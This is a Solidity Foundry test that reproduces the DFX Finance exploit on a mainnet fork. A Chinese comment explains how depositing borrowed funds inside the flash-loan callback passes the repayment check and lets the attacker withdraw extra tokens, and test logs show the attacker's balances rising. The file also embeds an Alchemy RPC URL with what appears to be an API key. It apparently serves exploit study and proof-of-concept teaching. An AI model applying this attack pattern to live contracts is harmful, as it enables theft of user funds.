// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./interface.sol";
  
interface IDFX_Finance {
    function viewDeposit(uint256 _deposit) external view returns (uint256, uint256[] memory);
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes memory data) external;
    function deposit(uint256 _deposit, uint256 _deadline) external returns (uint256, uint256[] memory);
    function withdraw(uint256 _curvesToBurn, uint256 _deadline) external returns (uint256[] memory withdrawals_);
}

address constant DFX_xidr_usdc_v2 = address(0x46161158b1947D9149E066d6d31AF1283b2d377C);
address constant DFX_FINANCE_MULTI_SIGN = address(0x27E843260c71443b4CC8cB6bF226C3f77b9695AF);

address constant TOKEN_XIDR = address(0xebF2096E01455108bAdCbAF86cE30b6e5A72aa52);
address constant TOKEN_USDC = address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

 
 /*

简单来说就是 先存钱 然后在里面借  还的时候  通过 deposite 存进去  这样一来  闪电贷借来的钱就用存钱给抵消了  多出的这部分就可以取出来 

function exploit(){
    dfx.flash()
    dfx.withdraw()
}

function flashCallback(){
    dfx.deposite()   // 这里存钱 刚好把闪电贷的验证条件给绕过去了 
}


为了满足flash函数中对于手续费收取的相关要求，攻击者存入的USDC,XIDR代币数量略高于之前从flash函数中闪电贷所得，
多出的这一部分代币将在flash函数中的后续执行操作中，发送给DFX Finance的多签钱包。攻击者在发起这次攻击之前准备了一些USDC,XIDR代币作为flash手续费，
通过deposit函数发送给被攻击合约的数量为flash闪电贷出的代币加上手续费代币之和，
这样在完成deposit操作的同时也能够完成flash函数中的检查。 
如此，攻击者通过在闪电贷的回调函数中对被攻击合约的deposit操作，满足了闪电贷的检查条件，同时还在被攻击合约中记录为deposit后的状态，
可以在后一步操作中进行withdraw操作取出代币。


https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/06_write_your_own_poc/
https://phalcon.xyz/tx/eth/0x6bfd9e286e37061ed279e4f139fbc03c8bd707a2cdd15f7260549052cbba79b7


https://etherscan.io/address/0x46161158b1947d9149e066d6d31af1283b2d377c#code
https://gnidan.github.io/abi-to-sol/

https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/DFX_exp.sol

$ forge test --match-path test/DFX_Finance.t.sol -vvv
Running 1 test for test/DFX_Finance.t.sol:Attacker
[PASS] testExploit() (gas: 373663)
Logs:
  before exploit : attacker XIDR balance:  3000000000000000
  before exploit : attacker USDC balance:  200000000000
  after view Deposite, can get  2325581395325581         100000000000
  after deposit, get  387134878542173576823470
  after exploit : attacker XIDR balance:  5271973497355614
  after exploit : attacker USDC balance:  299388527878

Test result: ok. 1 passed; 0 failed; finished in 836.71ms

 */
contract Attacker is Test {
    
    IDFX_Finance DFX = IDFX_Finance(DFX_xidr_usdc_v2);

    function setUp() public {
       vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/qXFbrurfVJ5Le9N3T3HwEi8Wc06v0Ud3", 15_941_703);
       vm.label(DFX_xidr_usdc_v2, "DFX_xidr_usdc_v2");
       vm.label(DFX_FINANCE_MULTI_SIGN, "DFX_FINANCE_MULTI_SIGN");
       vm.label(TOKEN_XIDR, "TOKEN_XIDR");
       vm.label(TOKEN_USDC, "TOKEN_USDC");

       deal(address(TOKEN_XIDR), address(this), 3 * 1e15);
       deal(address(TOKEN_USDC), address(this), 200 * 1e9);

       IERC20(TOKEN_XIDR).approve(DFX_xidr_usdc_v2, type(uint).max);
    //    IERC20(TOKEN_XIDR).approve(DFX_FINANCE_MULTI_SIGN, type(uint).max);

       IERC20(TOKEN_USDC).approve(DFX_xidr_usdc_v2, type(uint).max);
    //    IERC20(TOKEN_USDC).approve(DFX_FINANCE_MULTI_SIGN, type(uint).max);

    }

    uint256 totalReward;

    function testExploit() public {

        console2.log("before exploit : attacker XIDR balance: ", IERC20(TOKEN_XIDR).balanceOf(address(this)));
        console2.log("before exploit : attacker USDC balance: ", IERC20(TOKEN_USDC).balanceOf(address(this)));

        uint256[] memory amount = new uint256[](2);
        // amount[0] = 0;
        // amount[1] = 0;
        (, amount) = DFX.viewDeposit(200_000 * 1e18);
        console2.log("after view Deposite, can get ", amount[0], "\t", amount[1]);
       

        DFX.flash(address(this), amount[0]*995/1000, amount[1]*995/1000, "");
        DFX.withdraw(totalReward, block.timestamp + 60);

        console2.log("after exploit : attacker XIDR balance: ", IERC20(TOKEN_XIDR).balanceOf(address(this)));
        console2.log("after exploit : attacker USDC balance: ", IERC20(TOKEN_USDC).balanceOf(address(this)));
    }


    function flashCallback(uint256 fee0, uint256 fee1, bytes calldata data) public{
       (totalReward, ) =  DFX.deposit(200_000 * 1e18, block.timestamp + 60);
       console2.log("after deposit, get ",  totalReward);
    }
}

